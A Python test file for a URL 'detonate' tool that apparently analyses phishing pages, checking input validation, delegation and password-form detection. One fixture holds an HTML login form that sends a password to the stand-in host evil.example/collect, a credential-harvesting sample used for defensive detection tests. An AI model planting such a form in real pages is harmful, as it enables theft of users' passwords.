"""Contract tests for the detonate tool wiring (T-026).

Redirect/parsing behaviour is covered end to end in test_detonate.py
against a local fixture server — these only check that server.py's tool
wrapper validates its input and delegates correctly. Unlike domain_intel's
domain or notify_impersonated's address, `url` isn't pre-validated for
syntax here: detonate() itself already returns a structured
`{error: "refused non-http(s) scheme..."}` for a malformed URL instead of
raising, so a second validation layer in the wrapper would just duplicate
that check.

The three regression tests at the end of this file (Qodo's PR #37 review)
belong with test_detonate.py's own local-fixture-server suite by subject,
but that file lives on a separate stacked PR (#38, not yet merged) — kept
here instead of forking a same-named file that would collide with it, and
flagged in PLAN.md for whoever merges both to consider consolidating.
"""

from __future__ import annotations

from unittest.mock import patch

import pytest
from mcp.server.mcpserver.exceptions import ToolError

from imports_mcp.detonate import detonate as _detonate_module
from imports_mcp.server import detonate


def test_empty_url_is_rejected():
    with pytest.raises(ToolError):
        detonate("")


def test_whitespace_only_url_is_rejected():
    with pytest.raises(ToolError):
        detonate("   ")


@patch("imports_mcp.server._detonate")
def test_delegates_to_detonate_module_with_stripped_url(mock_detonate):
    mock_detonate.return_value = {"url": "https://example.com/", "redirect_chain": [], "error": "x"}

    detonate("  https://example.com/  ")

    mock_detonate.assert_called_once_with("https://example.com/")


@patch("imports_mcp.server._detonate")
def test_malformed_url_still_delegates_not_pre_rejected(mock_detonate):
    """A non-http(s) scheme is the detonate module's own job to report as
    a structured error, not the wrapper's to reject up front."""
    mock_detonate.return_value = {"url": "javascript:x", "redirect_chain": [], "error": "refused non-http(s) scheme: javascript"}

    result = detonate("javascript:x")

    mock_detonate.assert_called_once_with("javascript:x")
    assert result["error"]


# --- Qodo PR #37 review regressions ---


def test_malformed_starting_url_returns_structured_error_not_a_raise():
    """Finding #1: urlparse(current_url) on the very first loop iteration
    was unguarded - a malformed bracketed-authority starting URL (not just
    a malformed redirect Location or form action, both already covered)
    raised straight out of detonate() instead of degrading."""
    result = _detonate_module("http://[")
    assert isinstance(result, dict)
    assert result["error"]
    assert result["redirect_chain"] == []


def test_uppercase_password_type_is_still_detected():
    """Finding #2: HTML's `type` attribute is case-insensitive per spec -
    type="PASSWORD" is a real password field in every browser."""
    from imports_mcp.detonate import _extract_forms

    html = (
        '<html><body><form method="POST" action="https://evil.example/collect">'
        '<input type="PASSWORD" name="p"></form></body></html>'
    )
    forms = _extract_forms(html, "https://example.com/login")
    assert len(forms) == 1
    assert forms[0]["asks_password"] is True


def test_default_port_does_not_make_origins_cross_domain():
    """Finding #4: https://example.com and https://example.com:443 are the
    same origin - comparing raw scheme://netloc strings (which keep an
    explicit default port) would falsely flag a same-origin password form
    as suspicious."""
    from imports_mcp.detonate import _extract_forms

    html = (
        '<html><body><form method="POST" action="https://example.com:443/submit">'
        '<input type="password" name="p"></form></body></html>'
    )
    forms = _extract_forms(html, "https://example.com/login")
    assert len(forms) == 1
    assert forms[0]["action_origin"] == "https://example.com"
    assert forms[0]["cross_domain"] is False
